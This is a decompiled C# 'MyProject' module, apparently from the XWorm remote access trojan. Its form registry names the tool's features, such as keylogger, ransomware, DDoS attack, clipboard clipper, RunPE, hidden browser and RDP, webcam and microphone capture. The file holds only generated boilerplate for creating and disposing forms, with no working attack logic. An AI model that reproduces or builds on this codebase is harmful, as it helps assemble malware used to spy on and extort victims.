using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm.My;

[StandardModule]
[HideModuleName]
[GeneratedCode("MyTemplate", "11.0.0.0")]
internal sealed class MyProject
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	[MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
	internal sealed class MyForms
	{
		[ThreadStatic]
		private static Hashtable m_FormBeingCreated;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public About m_About;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ACT m_ACT;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Builder m_Builder;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Chat m_Chat;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Clipboard m_Clipboard;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Clipper m_Clipper;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public CustomOpen m_CustomOpen;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public DDosAttack m_DDosAttack;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public EditReg m_EditReg;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public FilesSearcher m_FilesSearcher;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public FM m_FM;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Ftp m_Ftp;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Fun m_Fun;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public HApps m_HApps;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Hash m_Hash;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public HBrowser m_HBrowser;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Hosts m_Hosts;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public HRDP m_HRDP;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Form2 m_Form2;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public INFO m_INFO;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Keylogger m_Keylogger;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Main m_Main;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Maps m_Maps;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public MBox m_MBox;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public MIC m_MIC;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ngrok m_ngrok;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Performance m_Performance;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Port m_Port;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ProcessV m_ProcessV;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Programs m_Programs;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Proxy m_Proxy;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Ransomware m_Ransomware;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Registry m_Registry;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public RemoteDesktop m_RemoteDesktop;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public RunPE m_RunPE;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ServiceManager m_ServiceManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Shell m_Shell;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Sound m_Sound;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public StartupManager m_StartupManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public TBotNotify m_TBotNotify;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public TcpConnectionForm m_TcpConnectionForm;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ToolsBox m_ToolsBox;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public TXT m_TXT;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public VBCode m_VBCode;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public VoiceChat m_VoiceChat;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public WebCam m_WebCam;

		public About About
		{
			[DebuggerHidden]
			get
			{
				m_About = Create__Instance__(m_About);
				return m_About;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_About)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_About);
				}
			}
		}

		public ACT ACT
		{
			[DebuggerHidden]
			get
			{
				m_ACT = Create__Instance__(m_ACT);
				return m_ACT;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ACT)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ACT);
				}
			}
		}

		public Builder Builder
		{
			[DebuggerHidden]
			get
			{
				m_Builder = Create__Instance__(m_Builder);
				return m_Builder;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Builder)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Builder);
				}
			}
		}

		public Chat Chat
		{
			[DebuggerHidden]
			get
			{
				m_Chat = Create__Instance__(m_Chat);
				return m_Chat;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Chat)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Chat);
				}
			}
		}

		public Clipboard Clipboard
		{
			[DebuggerHidden]
			get
			{
				m_Clipboard = Create__Instance__(m_Clipboard);
				return m_Clipboard;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Clipboard)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Clipboard);
				}
			}
		}

		public Clipper Clipper
		{
			[DebuggerHidden]
			get
			{
				m_Clipper = Create__Instance__(m_Clipper);
				return m_Clipper;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Clipper)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Clipper);
				}
			}
		}

		public CustomOpen CustomOpen
		{
			[DebuggerHidden]
			get
			{
				m_CustomOpen = Create__Instance__(m_CustomOpen);
				return m_CustomOpen;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_CustomOpen)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_CustomOpen);
				}
			}
		}

		public DDosAttack DDosAttack
		{
			[DebuggerHidden]
			get
			{
				m_DDosAttack = Create__Instance__(m_DDosAttack);
				return m_DDosAttack;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_DDosAttack)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_DDosAttack);
				}
			}
		}

		public EditReg EditReg
		{
			[DebuggerHidden]
			get
			{
				m_EditReg = Create__Instance__(m_EditReg);
				return m_EditReg;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_EditReg)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_EditReg);
				}
			}
		}

		public FilesSearcher FilesSearcher
		{
			[DebuggerHidden]
			get
			{
				m_FilesSearcher = Create__Instance__(m_FilesSearcher);
				return m_FilesSearcher;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_FilesSearcher)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_FilesSearcher);
				}
			}
		}

		public FM FM
		{
			[DebuggerHidden]
			get
			{
				m_FM = Create__Instance__(m_FM);
				return m_FM;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_FM)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_FM);
				}
			}
		}

		public Ftp Ftp
		{
			[DebuggerHidden]
			get
			{
				m_Ftp = Create__Instance__(m_Ftp);
				return m_Ftp;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Ftp)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Ftp);
				}
			}
		}

		public Fun Fun
		{
			[DebuggerHidden]
			get
			{
				m_Fun = Create__Instance__(m_Fun);
				return m_Fun;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Fun)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Fun);
				}
			}
		}

		public HApps HApps
		{
			[DebuggerHidden]
			get
			{
				m_HApps = Create__Instance__(m_HApps);
				return m_HApps;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_HApps)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_HApps);
				}
			}
		}

		public Hash Hash
		{
			[DebuggerHidden]
			get
			{
				m_Hash = Create__Instance__(m_Hash);
				return m_Hash;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Hash)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Hash);
				}
			}
		}

		public HBrowser HBrowser
		{
			[DebuggerHidden]
			get
			{
				m_HBrowser = Create__Instance__(m_HBrowser);
				return m_HBrowser;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_HBrowser)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_HBrowser);
				}
			}
		}

		public Hosts Hosts
		{
			[DebuggerHidden]
			get
			{
				m_Hosts = Create__Instance__(m_Hosts);
				return m_Hosts;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Hosts)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Hosts);
				}
			}
		}

		public HRDP HRDP
		{
			[DebuggerHidden]
			get
			{
				m_HRDP = Create__Instance__(m_HRDP);
				return m_HRDP;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_HRDP)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_HRDP);
				}
			}
		}

		public Form2 Form2
		{
			[DebuggerHidden]
			get
			{
				m_Form2 = Create__Instance__(m_Form2);
				return m_Form2;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Form2)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Form2);
				}
			}
		}

		public INFO INFO
		{
			[DebuggerHidden]
			get
			{
				m_INFO = Create__Instance__(m_INFO);
				return m_INFO;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_INFO)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_INFO);
				}
			}
		}

		public Keylogger Keylogger
		{
			[DebuggerHidden]
			get
			{
				m_Keylogger = Create__Instance__(m_Keylogger);
				return m_Keylogger;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Keylogger)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Keylogger);
				}
			}
		}

		public Main Main
		{
			[DebuggerHidden]
			get
			{
				m_Main = Create__Instance__(m_Main);
				return m_Main;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Main)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Main);
				}
			}
		}

		public Maps Maps
		{
			[DebuggerHidden]
			get
			{
				m_Maps = Create__Instance__(m_Maps);
				return m_Maps;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Maps)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Maps);
				}
			}
		}

		public MBox MBox
		{
			[DebuggerHidden]
			get
			{
				m_MBox = Create__Instance__(m_MBox);
				return m_MBox;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_MBox)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_MBox);
				}
			}
		}

		public MIC MIC
		{
			[DebuggerHidden]
			get
			{
				m_MIC = Create__Instance__(m_MIC);
				return m_MIC;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_MIC)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_MIC);
				}
			}
		}

		public ngrok ngrok
		{
			[DebuggerHidden]
			get
			{
				m_ngrok = Create__Instance__(m_ngrok);
				return m_ngrok;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ngrok)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ngrok);
				}
			}
		}

		public Performance Performance
		{
			[DebuggerHidden]
			get
			{
				m_Performance = Create__Instance__(m_Performance);
				return m_Performance;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Performance)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Performance);
				}
			}
		}

		public Port Port
		{
			[DebuggerHidden]
			get
			{
				m_Port = Create__Instance__(m_Port);
				return m_Port;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Port)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Port);
				}
			}
		}

		public ProcessV ProcessV
		{
			[DebuggerHidden]
			get
			{
				m_ProcessV = Create__Instance__(m_ProcessV);
				return m_ProcessV;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ProcessV)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ProcessV);
				}
			}
		}

		public Programs Programs
		{
			[DebuggerHidden]
			get
			{
				m_Programs = Create__Instance__(m_Programs);
				return m_Programs;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Programs)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Programs);
				}
			}
		}

		public Proxy Proxy
		{
			[DebuggerHidden]
			get
			{
				m_Proxy = Create__Instance__(m_Proxy);
				return m_Proxy;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Proxy)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Proxy);
				}
			}
		}

		public Ransomware Ransomware
		{
			[DebuggerHidden]
			get
			{
				m_Ransomware = Create__Instance__(m_Ransomware);
				return m_Ransomware;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Ransomware)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Ransomware);
				}
			}
		}

		public Registry Registry
		{
			[DebuggerHidden]
			get
			{
				m_Registry = Create__Instance__(m_Registry);
				return m_Registry;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Registry)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Registry);
				}
			}
		}

		public RemoteDesktop RemoteDesktop
		{
			[DebuggerHidden]
			get
			{
				m_RemoteDesktop = Create__Instance__(m_RemoteDesktop);
				return m_RemoteDesktop;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_RemoteDesktop)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_RemoteDesktop);
				}
			}
		}

		public RunPE RunPE
		{
			[DebuggerHidden]
			get
			{
				m_RunPE = Create__Instance__(m_RunPE);
				return m_RunPE;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_RunPE)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_RunPE);
				}
			}
		}

		public ServiceManager ServiceManager
		{
			[DebuggerHidden]
			get
			{
				m_ServiceManager = Create__Instance__(m_ServiceManager);
				return m_ServiceManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ServiceManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ServiceManager);
				}
			}
		}

		public Shell Shell
		{
			[DebuggerHidden]
			get
			{
				m_Shell = Create__Instance__(m_Shell);
				return m_Shell;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Shell)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Shell);
				}
			}
		}

		public Sound Sound
		{
			[DebuggerHidden]
			get
			{
				m_Sound = Create__Instance__(m_Sound);
				return m_Sound;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Sound)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Sound);
				}
			}
		}

		public StartupManager StartupManager
		{
			[DebuggerHidden]
			get
			{
				m_StartupManager = Create__Instance__(m_StartupManager);
				return m_StartupManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_StartupManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_StartupManager);
				}
			}
		}

		public TBotNotify TBotNotify
		{
			[DebuggerHidden]
			get
			{
				m_TBotNotify = Create__Instance__(m_TBotNotify);
				return m_TBotNotify;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_TBotNotify)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_TBotNotify);
				}
			}
		}

		public TcpConnectionForm TcpConnectionForm
		{
			[DebuggerHidden]
			get
			{
				m_TcpConnectionForm = Create__Instance__(m_TcpConnectionForm);
				return m_TcpConnectionForm;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_TcpConnectionForm)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_TcpConnectionForm);
				}
			}
		}

		public ToolsBox ToolsBox
		{
			[DebuggerHidden]
			get
			{
				m_ToolsBox = Create__Instance__(m_ToolsBox);
				return m_ToolsBox;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ToolsBox)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ToolsBox);
				}
			}
		}

		public TXT TXT
		{
			[DebuggerHidden]
			get
			{
				m_TXT = Create__Instance__(m_TXT);
				return m_TXT;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_TXT)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_TXT);
				}
			}
		}

		public VBCode VBCode
		{
			[DebuggerHidden]
			get
			{
				m_VBCode = Create__Instance__(m_VBCode);
				return m_VBCode;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_VBCode)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_VBCode);
				}
			}
		}

		public VoiceChat VoiceChat
		{
			[DebuggerHidden]
			get
			{
				m_VoiceChat = Create__Instance__(m_VoiceChat);
				return m_VoiceChat;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_VoiceChat)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_VoiceChat);
				}
			}
		}

		public WebCam WebCam
		{
			[DebuggerHidden]
			get
			{
				m_WebCam = Create__Instance__(m_WebCam);
				return m_WebCam;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_WebCam)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_WebCam);
				}
			}
		}

		[DebuggerHidden]
		private static T Create__Instance__<T>(T Instance) where T : Form, new()
		{
			if (Instance != null && !Instance.IsDisposed)
			{
				return Instance;
			}
			if (m_FormBeingCreated != null)
			{
				if (m_FormBeingCreated.ContainsKey(typeof(T)))
				{
					throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate"));
				}
			}
			else
			{
				m_FormBeingCreated = new Hashtable();
			}
			m_FormBeingCreated.Add(typeof(T), null);
			try
			{
				return new T();
			}
			catch (TargetInvocationException ex) when (((Func<bool>)delegate
			{
				// Could not convert BlockContainer to single expression
				ProjectData.SetProjectError(ex);
				return ex.InnerException != null;
			}).Invoke())
			{
				throw new InvalidOperationException(Utils.GetResourceString("WinForms_SeeInnerException", ex.InnerException.Message), ex.InnerException);
			}
			finally
			{
				m_FormBeingCreated.Remove(typeof(T));
			}
		}

		[DebuggerHidden]
		private void Dispose__Instance__<T>(ref T instance) where T : Form
		{
			instance.Dispose();
			instance = null;
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyForms()
		{
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		public override bool Equals(object o)
		{
			return base.Equals(RuntimeHelpers.GetObjectValue(o));
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		public override int GetHashCode()
		{
			return base.GetHashCode();
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		internal new Type GetType()
		{
			return typeof(MyForms);
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		public override string ToString()
		{
			return base.ToString();
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
	internal sealed class MyWebServices
	{
		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override bool Equals(object o)
		{
			return base.Equals(RuntimeHelpers.GetObjectValue(o));
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override int GetHashCode()
		{
			return base.GetHashCode();
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		internal new Type GetType()
		{
			return typeof(MyWebServices);
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override string ToString()
		{
			return base.ToString();
		}

		[DebuggerHidden]
		private static T Create__Instance__<T>(T instance) where T : new()
		{
			if (instance == null)
			{
				return new T();
			}
			return instance;
		}

		[DebuggerHidden]
		private void Dispose__Instance__<T>(ref T instance)
		{
			instance = default(T);
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyWebServices()
		{
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[ComVisible(false)]
	internal sealed class ThreadSafeObjectProvider<T> where T : new()
	{
		[CompilerGenerated]
		[ThreadStatic]
		private static T m_ThreadStaticValue;

		internal T GetInstance
		{
			[DebuggerHidden]
			get
			{
				if (m_ThreadStaticValue == null)
				{
					m_ThreadStaticValue = new T();
				}
				return m_ThreadStaticValue;
			}
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ThreadSafeObjectProvider()
		{
		}
	}

	private static readonly ThreadSafeObjectProvider<MyComputer> m_ComputerObjectProvider = new ThreadSafeObjectProvider<MyComputer>();

	private static readonly ThreadSafeObjectProvider<MyApplication> m_AppObjectProvider = new ThreadSafeObjectProvider<MyApplication>();

	private static readonly ThreadSafeObjectProvider<User> m_UserObjectProvider = new ThreadSafeObjectProvider<User>();

	private static ThreadSafeObjectProvider<MyForms> m_MyFormsObjectProvider = new ThreadSafeObjectProvider<MyForms>();

	private static readonly ThreadSafeObjectProvider<MyWebServices> m_MyWebServicesObjectProvider = new ThreadSafeObjectProvider<MyWebServices>();

	[HelpKeyword("My.Computer")]
	internal static MyComputer Computer
	{
		[DebuggerHidden]
		get
		{
			return m_ComputerObjectProvider.GetInstance;
		}
	}

	[HelpKeyword("My.Application")]
	internal static MyApplication Application
	{
		[DebuggerHidden]
		get
		{
			return m_AppObjectProvider.GetInstance;
		}
	}

	[HelpKeyword("My.User")]
	internal static User User
	{
		[DebuggerHidden]
		get
		{
			return m_UserObjectProvider.GetInstance;
		}
	}

	[HelpKeyword("My.Forms")]
	internal static MyForms Forms
	{
		[DebuggerHidden]
		get
		{
			return m_MyFormsObjectProvider.GetInstance;
		}
	}

	[HelpKeyword("My.WebServices")]
	internal static MyWebServices WebServices
	{
		[DebuggerHidden]
		get
		{
			return m_MyWebServicesObjectProvider.GetInstance;
		}
	}
}
